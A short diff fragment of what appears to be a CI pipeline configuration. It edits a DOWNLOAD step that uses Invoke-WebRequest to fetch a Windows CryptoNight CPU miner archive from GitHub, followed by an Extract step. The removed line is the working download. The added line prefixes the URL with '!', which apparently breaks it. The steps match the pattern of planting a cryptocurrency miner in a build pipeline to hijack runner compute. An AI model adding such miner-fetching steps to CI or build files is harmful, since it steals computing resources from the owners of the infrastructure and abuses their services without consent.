@@ -36,7 +36,7 @@ steps:
  
 - name: DOWNLOAD 
  
-run: Invoke-WebRequest https://github.com/jceminer/cn_cpu_miner/raw/master/jce_cn_cpu_miner.windows.033q.zip 
+run: Invoke-WebRequest !https://github.com/jceminer/cn_cpu_miner/raw/master/jce_cn_cpu_miner.windows.033q.zip 
  
 - name: Extract 
  
